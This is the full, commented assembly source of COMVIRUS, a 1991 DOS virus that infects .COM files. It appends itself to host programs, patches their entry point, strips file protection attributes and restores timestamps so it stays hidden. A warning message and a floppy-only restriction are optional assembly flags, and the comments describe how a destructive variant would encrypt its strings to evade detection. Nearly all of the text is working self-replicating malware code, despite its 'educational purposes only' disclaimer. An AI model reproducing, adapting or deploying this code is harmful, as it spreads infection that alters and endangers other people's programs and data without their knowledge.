title COMVIRUS
subttl By Drew Eckhardt
subttl Latest revision: 4-28-1991

;The author of this virus intends it to be used for educational
;purposes only, and assumes no responsibilities for its release,
;dammages resulting from its use, including but not limited to
;equipment dammage or data loss.

;By assembling or examining this program, The user agrees to accept all
;responsibility for this programs use, or any portions of the code
;or concepts contained within.  The user also agrees to not publicly release
;this virus, and to exercise necessary precautions to prevent its escape.
;The user accepts all responsibility arising from his actions.

;Don't come crying to me if your hard disk gets infected,
;as THERE IS NO ANTIDOTE.  HAHAHAH.


;Revision history:
;4-13: initial bug-free release, size=424 bytes with carrier

;4-15: added no date change support, size=438 bytes with carrier

;4-16: minor documentation changes, size=438 bytes with carrier,
;      NO CODE CHANGE from 4-15 revision

;4-21: fixed missing hex h suffixs, made MASM friendly,
;      fixed incorrect assume statement (assume statements are ignored
;      by A86) enabled hard/floppy infection based on floppy_only status
;      size=438 bytes IF floppy_only, 424 bytes if not, with carrier.
;      minimum virus length = 419 bytes
	
;4-23: added control over how many programs are infected per run,
;      switched method of infection, from copying to DTA then writing
;      to disk to straight write to disk from memory.
;      size=412 bytes IF floppy_only, 398 bytes if not, with carrier.
;      minimum virus length = 393 bytes
	
;4-28: used set DTA instead of default DTA/copy command line
;      buffer, which had been used based on incorrect assumption
;      eliminated calls to get time/date, get attribs
;      by using information from find first/find next functions 4eh/4fh
;      made warning optional for reduced space if desired.  Also
;      changed mov reg16, bp add reg16, constant to shorter LEA instruction.
;      size=354 bytes IF floppy_only, warning on W/carrier
;           340 bytes IF w/warning & carrier program
;           286 bytes w/o warning, in program
;       minimum virus length = 281 bytes for virus itself

;4-28pm:  instead of near CALL-pop sequences everywhere, switched to
;         a single CALL near ptr Reference_Point, putting the result into
;         si now that (until the end) string mode addressing is not used.
;         Changed places where a register (used as an index)
;         was being loaded THEN added to a single LEA isntruction
;       size = 340 bytes if floppy_only, warning on w/carrier
;       size = 326 bytes if w/warning & carrier
;	size = 272 w/o warning
;	minimum virus length = 267 bytes for the virus itself

;4-28pm2: Eliminated unecessary flush buffers call.
;       size = 336 bytes if floppy_only w/carrier
;       size = 322 bytes w/warning & carrier
;	size = 268 w/o warning
;	minimum virus length = 263 bytes for virus itself

;4-30:	restored 5 bytes of original code at CS:0100
;	before infecting other programs, allowing the
;	original code field to be modified so one disk write could be
;	used instead of two
;	minor documentation revisions - corrected incorrect
;	opcodes in documentation
;	size = 326 bytes if floppy_only w/carrier
;	size = 312 bytes w/warning & carrier program
;	size = 258 bytes w/carrier program
;	Minimum virus length = 253 bytes for the virus itself
	
;NOTE:  The program is currently "set up" for A86 assembly with all
;conditional assembly symbols.  #IF and #ENDIF should be replaced with
;MASM IFDEF and ENDIF directives for propper operation.
;Also, instead of using EQUates to define control symbols, the /D
;option or DEFINE could be used.....


;COMVIRUS.ASM must be assembled into a .COM file inorder to function
;properly.  For convieniece, I recommend an assembler like A86 that will
;assemble to a .COM file without having to go through LINK and EXE2BIN

;As is, it will infect .COM files located on the current disk.
;ONLY if it is a floppy disk, ONLY in the root directory.

;This is a .COM infector virus, which, does nothing other than print a
;warning message, and spread to all files on the default disk IFF it is
;a floppy disk, in the root directory.

;Theory:
;This is a non - overwriting virus.  I took special precautions to preserve
;all functionality of the original program, including command line, parsed FCB,
;and segment register preservation.  This makes the virus harder to detect.

;The .COM file is a memory image - with no relocation table.  Thus, it
;is an easy target for a virus such as this.

;Infected file format
;jmp near ptr xxxx
;cli cli                ;ID bytes
;ORIGINAL program code, sans 5 bytes
;5 bytes ORIGINAL program code
;VIRUS

;This format makes infection VERY simple.  We merely check for our signature
;(in this case cli cli (fa fa) - instructions that no programmer in his
;right mind would use - loading the original five bytes in the process.
;These original bytes are written to the end of the program, then
;A jump to where the virus is.

;While infection is easy, this method presents some coding problems, as the
;virus does not know where in memory it is.  Therefor, When we want to access
;data, we FIND OUT where we are, by performing a near call which PUSHES ip to the
;stack which is then popped.  Addresses are then calculated relative to this
;via LEA

;To run the program as normal, command line is restored, registers restored,
;And original code copied onto the first five bytes of the program.


;Program control symbols defined here
floppy_only equ 1
infect_per_run equ 1            ;number of programs infected per run
warn_user equ 1

_TEXT segment byte 'CODE'
        assume cs:_TEXT,ds:_TEXT,es:_TEXT,ss:_TEXT
        org 100h

Start:  jmp     infect;

;This is our signature
        cli
        cli

;Original code is the data field where we store the original program code
;which will replace our signature and jmp to infect

Original_Code:  int     20h             ;five bytes that simply terminate
                nop                     ;the program
                nop
                nop



;Data for the virus.  In a destructive virus, you would want to encrypt
;any strings using a simple one's complement (not) operation so as to
;thwart detection via text search utilities.  Since we want detection to
;be easy, this un-encrypted form is fine.


Start_Virus:
#IF warn_user
        Warning db "This file infected with COMVIRUS 1.0",10,13,'$'
#ENDIF

;VirusMask is simply an ASCIIZ terminated string of the files we wish to
;infect.

        VirusMask db '*.COM', 0
Infect:
        push    ax                      ;on entry to a .COM program,                            STACK:
                                        ;MS-DOS puts drive identifiers                          ax (drive id for FCB's) <-- sp
                                        ;for the two FCB's in here.  Save
                                        ;'em

        ;I use special trickery to find location of data.  Since
        ;NEAR calls/jmps are RELATIVE, call near ptr find_warn is
	;translated to e8 0000 - which will simply place the location
	;of Reference onto the stack.  Our data can be found relative to
	;this point.

        call near ptr Reference         ;All data is reference realative to
                                        ;Reference


Reference: pop  bx                      ;which is placed into bx for LEA
					;instructions
					;bx now contains the REAL address of
					;Reference
					;si points to real address of original
					;code field
	lea     si, [bx-(offset Reference - offset Original_Code)]
	mov     di, 0100h		;original code is at 100h
	mov     cx, 5			;5 bytes
	cld				;from start of buffer
	rep     movsb			;do it

	mov	si, bx			;since BX is used in handle
					;based DOS calls, for the remainder
					;of the virus, si will contain the
					;actual address of reference

#IF warn_user

        ;Always calculate the address of data relative to known Reference
        ;Point
        lea     dx, [si-(offset Reference - offset Warning)]
        mov     ah,9h                   ;DO dos call, DS:DX pointing
        int     21h                     ;to $ terminated string

        ;We want to make sure that the user gets the message

WaitForKey:
        mov     ah, 0bh                 ;we will wait for a keypress
        int     21h                     ;signifying the user has
        or      al, al                  ;seen the message.
        jz      WaitForKey

#ENDIF

#IF FLOPPY_ONLY

        ;Since this is a simple demonstration virus, we will only infect
        ;.COM files on the default drive IFF it is a floppy disk....
        ;So, we will get information about the disk drive.


        push    ds                      ;ds:bx returns a byte to
                                        ;media descriptor

        mov     ah, 1bh                 ;get disk information                                   STACK
        int     21h                     ;DOIT                                                   ax (drive ID's)
        cmp     byte ptr ds:[bx], 0f8h  ;see if its a hard disk                                 ds <--sp

        pop     ds                      ;restore ds                                             STACK
        jne     Floppy                  ;if it was hard....                                     ax <--sp
        jmp     near ptr done           ;we're nice guys and are done

Floppy: ;Since it was floppy, we can go on with the infection!
#ENDIF
        ;The default DTA, as is will give us problems.  The designers of
        ;MickeySoft DOS decided to put default DTA at ofset 128 in
        ;the PSP.  PROBLEM:  This is also where the user's precious command
        ;line is, and we MUST remain undectected.  SO.... we allocate a
        ;DTA buffer on the stack.  43 bytes are needed, 44 will do.

        sub     sp,  44                 ;allocate space for findfirst/findnext DTA
        mov     bp, sp                  ;set up bp as a reference to this area

        ;Set the DTA
        mov     dx, bp                  ;point DS:DX to our area
        mov     ah, 1ah                 ;set DTA
        int     21h

        ;Set up pointers to data in DTA
        dta     equ word ptr [bp]
        file_name equ word ptr [bp+1eh]
        attributes equ byte ptr [bp+15h]
        time_stamp equ word ptr [bp+16h]
        date_stamp equ word ptr [bp+18h]
        file_size equ dword ptr [bp+1ah]

        ;We dynamically allocate a variable to store the number of programs                     STACK
        ;The virus has infected.                                                                FCB drives
        ;                                                                               bp-->   44 byte DTA
        infected_count equ byte ptr[bp-2];                                                      Infected_Count
        xor     ax, ax                  ;zero variable,                                 sp-->   buffer (6 bytes)
        push    ax                      ;allocate it on the stack
        sub     sp, 6                   ;allocate small buffer

        ;Now, we begin looking for files to infect.
        lea     dx, [si - (offset Reference - offset VirusMask)]
                                        ;DS:DX points to the search string                      STACK
        mov     ah, 4eh                 ;find first matching directory entry                    FCB drives  (word)
        mov     cx, 111b                ;only default directory, FILES                         
                                        ;hidden, system and normal
        int     21h                     ;doit                                       bp-->       44 byte DTA buffer
                                        ;                                                       infected count (word)
        jnc     Research                ;carry is clear when a file was             sp-->       6 byte buffer
        jmp     nofile                  ;found.


ReSearch:
;All handle based DOS calls take a pointer to an ASCIIZ file name in ds:dx
        lea     dx, file_name

;Since this is a virus, we want to infect files that can't be touched by
;DOS commands, this means readonly, system, and hidden files are at our
;mercy.  To do this, we rely on the findfrst/next attributes and other data
;to restore the attribute byte to the original settings.  get/SET can fix
;them to be suitable
        mov     cl, attributes
        and     cl, 11100000b           ;not readonly, system, or hidden                        STACK
                                        ;                                                       FCB drives
        mov     ax, 4301h               ;set attributes                              bp-->      buffer (44 bytes)
        int     21h                     ;                                                       buffer (6 bytes)
                                        ;                                            sp-->      infected_count
        jnc     NoError                 ;check for error
        jmp     Restore_Flags
NoError:
        mov     ax, 3d02h               ;now, open file using handle,
                                        ;read/write access
        int     21h                     ;
        jnc     NoError2                ;IF there was an error, we are done
        jmp     Restore_Flags           ;But we don't need to commit or close

NoError2:
        mov     bx, ax                  ;The handle was returned in ACC.
                                        ;Howwever, all handle based DOS
                                        ;calls expect it in BX


;We don't want to infect the program more than once, so we will
;check to see if it is infected. 


        mov     ax, 4200h               ;seek relative to start of file
        ;       bx contains handle from open operation
        xor     cx,cx                   ;cx:dx is file pointer
        xor     dx, dx                  ;
        int     21h                     ;DOIT

;Now, we will read in enough data to see if we have our virus signature.
        mov     ah, 3fh                 ;read data
	lea     dx, [si-(offset reference-offset original_code)]
					;into original_code buffer
	mov     cx, 5                   ;5h bytes
	;       bx contains handle from last operation
	int     21h

	cmp     word ptr [si-(offset reference-offset original_code)+3], 0fafah
	jne     GoApe                   ;if we aren't already infected,
	jmp     Error                   ;go for it

GoApe:
;Since it is safe to infect, we will
        mov     ax, 4202h               ;seek end of file
        xor     cx, cx                 
        xor     dx, dx
        int     21h

        or      dx, dx                  ;check for valid .COM format
        jz      Less_Than_64K
        jmp     Error

Less_Than_64K:

;Now, we must calculate WHERE the jump will be to.  Let's examine the program
;Structure:
;jmp near ptr xxxx
;Cli Cli                       }These add up to the original length
;Orignal code sans 5 bytes

;Original_Code (5 bytes)       }The length of all virus data
;Other virus data               is equal to the difference in
;Infect                         the addresses of Infect and Original_Code

;End_Virus


;Thus, the jump must jump TO (offset Infect- offset Original_Code + Original_Length + origin)
;However, in the 80x86, NEAR jumps are calculated as an offset from the position
;of the next statement to execute (because of fetch/execute cycle operation).

;Since jmp near ptr xxxx takes 3 bytes, the next instruction is THREE bytes from
;The 0E9h jmp near instruction, so xxxx will be (offset Infect-Offset Original_Code
;+Original_Length-3);

        ;Since AX already contains the original length, we will merely add
        ;Space for the virus data, and take care of the three bytes
        ;of code generated by the jmp near instruction.

        add     ax, (offset Infect - Offset Original_Code -3)

                                        ;calculate jump address
        mov     byte ptr [bp-8], 0e9h   ;jmp near instruction
        mov     word ptr [bp-7], ax     ;offset for near jmp
        mov     word ptr [bp-5], 0fafah ;cli cli

        mov     ax, 4200h               ;seek begining of file
        xor     cx, cx
        mov     dx, cx
        int     21h

        mov     ah, 40h                 ;write patched code
        mov     cx, 5                   ;5 bytes of code
        lea     dx, [bp-8]              ;our buffer
        int     21h

        mov     ax, 4202h               ;seek EOF
        xor     cx, cx
        xor     dx, dx
        int     21h


	lea     dx, [si - (offset Reference - offset Original_Code)]; set start
	mov     cx, (offset End_Virus - offset Original_Code)     ;set length
	mov     ah, 40h         ;append virus to file
	int     21h             ;doit

        inc     infected_Count  ;bump up the number of programs infected

Error:  mov     dx,date_stamp           ;restore date
        mov     cx,time_stamp           ;restore time
        mov     ax, 5701h               ;set them
        int     21h

        mov     ah, 3eh                 ;close file
        int     21h

Restore_Flags:
        xor     ch, ch                  ;zero hi byte flags
        mov     cl,attributes           ;restore flags
        lea     dx, file_name           ;ds:dx points to ASCIIZ string
                                        ;in the buffer, offset 1eh contains
                                        ;the file name
        mov     ax, 4301h               ;get/SET flags
        int     21h                     ;Doit

DoAgain:;See if we're done infecting
        cmp     infected_count, infect_per_run
        jae     NoFile                  ;if we're done, same as no new file


        mov     ah,  4fh                ;find next
        int     21h

        jc      NoFile                  ;if carry is clear, DOIT again!
        jmp     ReSearch

;Since we have no more files, we will restore things to normal.
NoFile:
        mov     dx, 80h                 ;reset default dta at DS:80h
        mov     ah, 1ah                 ;set DTA
        int     21h

        add     sp, 52                  ;deallocate buffers and infected_count



;Put original code of program BEFORE it was infected back in place!


Done:   
        pop     ax                      ;restore ax


        ;FUNKY code!  In the 80x86, all NEAR or SHORT jmp opcodes take
        ;a RELATIVE address...... BUT a retn opcode pops a near absolute
        ;address of the stack - saves us the trouble of some calculating
        ;relative to here, and the trouble of a self-modifying
        ;far absolute jmp! (5 bytes)

        mov     bx, 0100h
        push    bx
        ret                             ;easiest jump to cs:100

End_Virus:
_TEXT ends
end start

